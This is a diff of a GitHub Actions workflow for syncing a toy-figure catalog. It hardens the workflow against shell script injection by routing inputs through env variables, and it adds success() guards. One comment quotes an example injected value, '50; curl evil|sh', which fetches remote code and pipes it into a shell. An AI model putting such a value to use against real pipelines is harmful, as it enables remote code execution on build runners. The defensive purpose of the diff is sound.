@@ -1,5 +1,13 @@
 name: Sync AF411 Catalog
 
+# ── Workflow v1.8 (security/reliability audit) ──────────────────────────
+#   • run-name below stamps every run with the version for visual confirmation.
+#   • workflow_dispatch string inputs are passed via env: (not interpolated
+#     into run: blocks) to remove a shell script-injection vector.
+#   • the commit/push and Discord steps gained an explicit success() guard so
+#     they no longer run when the sync step failed.
+run-name: "Sync AF411 Catalog v1.8 · ${{ github.event_name }}${{ inputs.line && format(' · {0}', inputs.line) || '' }}"
+
 on:
   workflow_dispatch:
     inputs:
@@ -46,35 +54,57 @@ jobs:
           python-version: '3.12'
 
       - name: Run sync script
+        # AUDIT FIX (v1.8): bind all workflow_dispatch inputs + the event name
+        # to environment variables here, and reference them as "$VAR" in the
+        # script below. Previously inputs.upc_limit (a free-form `type: string`)
+        # was interpolated directly into this run: block via ${{ }}, which is a
+        # shell script-injection sink — a value like `50; curl evil|sh` would
+        # have executed. Going through env: means the Actions template engine
+        # never rewrites the script text with user data; the shell just reads
+        # the variable. The other inputs (choice/boolean) were already
+        # constrained, but are routed the same way for consistency.
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          IN_LINE: ${{ inputs.line }}
+          IN_AUDIT_ONLY: ${{ inputs.audit_only }}
+          IN_CAPTURE_UPC: ${{ inputs.capture_upc }}
+          IN_UPC_LIMIT: ${{ inputs.upc_limit }}
         run: |
-          cd ${{ github.workspace }}
-          CMD="python scripts/sync_af411.py"
+          cd "$GITHUB_WORKSPACE"
+          set -- python scripts/sync_af411.py
           # Scheduled runs are always commit-mode; manual runs respect audit_only.
-          if [ "${{ github.event_name }}" = "schedule" ] || [ "${{ inputs.audit_only }}" != "true" ]; then
-            CMD="$CMD --commit"
+          if [ "$EVENT_NAME" = "schedule" ] || [ "$IN_AUDIT_ONLY" != "true" ]; then
+            set -- "$@" --commit
           else
-            CMD="$CMD --audit"
+            set -- "$@" --audit
           fi
-          if [ -n "${{ inputs.line }}" ]; then
-            CMD="$CMD --line ${{ inputs.line }}"
+          if [ -n "$IN_LINE" ]; then
+            set -- "$@" --line "$IN_LINE"
           fi
           # UPC capture is MANUAL-ONLY and never runs on the daily schedule —
           # it costs one detail-page fetch per figure, so it's opt-in via the
           # workflow_dispatch toggle. The script itself is incremental (skips
           # figures that already have a upc), so repeat manual runs are cheap.
-          if [ "${{ github.event_name }}" != "schedule" ] && [ "${{ inputs.capture_upc }}" = "true" ]; then
-            CMD="$CMD --upc"
-            if [ -n "${{ inputs.upc_limit }}" ]; then
-              CMD="$CMD --upc-limit ${{ inputs.upc_limit }}"
+          if [ "$EVENT_NAME" != "schedule" ] && [ "$IN_CAPTURE_UPC" = "true" ]; then
+            set -- "$@" --upc
+            if [ -n "$IN_UPC_LIMIT" ]; then
+              set -- "$@" --upc-limit "$IN_UPC_LIMIT"
             fi
           fi
-          echo "Running: $CMD"
-          $CMD
+          echo "Running: $*"
+          "$@"
 
       - name: Commit and push changes
-        if: ${{ github.event_name == 'schedule' || inputs.audit_only != 'true' }}
+        # AUDIT FIX (v1.8): success() && (...). A bare `if:` overrides the
+        # implicit success() gate, so the previous condition would run this
+        # commit step even if the sync step had failed — risking a push of
+        # partial/garbage state. The success() prefix restores that gate.
+        if: ${{ success() && (github.event_name == 'schedule' || inputs.audit_only != 'true') }}
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          IN_LINE: ${{ inputs.line }}
         run: |
-          cd ${{ github.workspace }}
+          cd "$GITHUB_WORKSPACE"
           git config user.name "MOTU Vault Bot"
           git config user.email "motu-vault-bot@users.noreply.github.com"
           # Stage everything the scraper might have written.
@@ -90,10 +120,10 @@ jobs:
           NEW_PENDING=$(git diff --cached --numstat figures-pending.json 2>/dev/null | awk '{print $1}')
           NEW_IMGS=$(git diff --cached --name-only -- "*.jpg" | wc -l | tr -d ' ')
           LINE_MSG=""
-          if [ -n "${{ inputs.line }}" ]; then
-            LINE_MSG=" (${{ inputs.line }})"
+          if [ -n "$IN_LINE" ]; then
+            LINE_MSG=" ($IN_LINE)"
           fi
-          TRIGGER="${{ github.event_name }}"
+          TRIGGER="$EVENT_NAME"
           TIMESTAMP=$(date -u +"%Y-%m-%d %H:%M UTC")
           git commit -m "sync: update catalog from AF411${LINE_MSG} — ${TIMESTAMP} [${TRIGGER}]" \
                      -m "Figures: ${NEW_FIGS:-0} lines · Pending: ${NEW_PENDING:-0} lines · Images: ${NEW_IMGS}"
@@ -124,9 +154,12 @@ jobs:
       # secret is set or if no new pending figures were added (refreshes
       # don't notify).
       - name: Notify Discord on new pending figures
-        if: ${{ github.event_name == 'schedule' || inputs.audit_only != 'true' }}
+        # AUDIT FIX (v1.8): success() guard (see commit step) + github.repository
+        # routed through env instead of inline ${{ }} interpolation.
+        if: ${{ success() && (github.event_name == 'schedule' || inputs.audit_only != 'true') }}
         env:
           DISCORD_WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL }}
+          GH_REPOSITORY: ${{ github.repository }}
         run: |
           if [ -z "$DISCORD_WEBHOOK_URL" ]; then
             echo "DISCORD_WEBHOOK_URL secret not set — skipping notification"
@@ -152,7 +185,7 @@ jobs:
           ' "$SUMMARY")
           EXTRA=$(jq -r 'if .new_pending_count > 10 then "…and " + ((.new_pending_count - 10) | tostring) + " more" else "" end' "$SUMMARY")
           PENDING_TOTAL=$(jq -r '.pending_total // 0' "$SUMMARY")
-          REPO_URL="https://github.com/${{ github.repository }}"
+          REPO_URL="https://github.com/$GH_REPOSITORY"
           EDITOR_URL="https://shkankin.github.io/motu-images/figures-editor.html"
           # Build embed via jq for safe JSON escaping of any character in
           # figure names (apostrophes, ampersands, unicode, etc.).
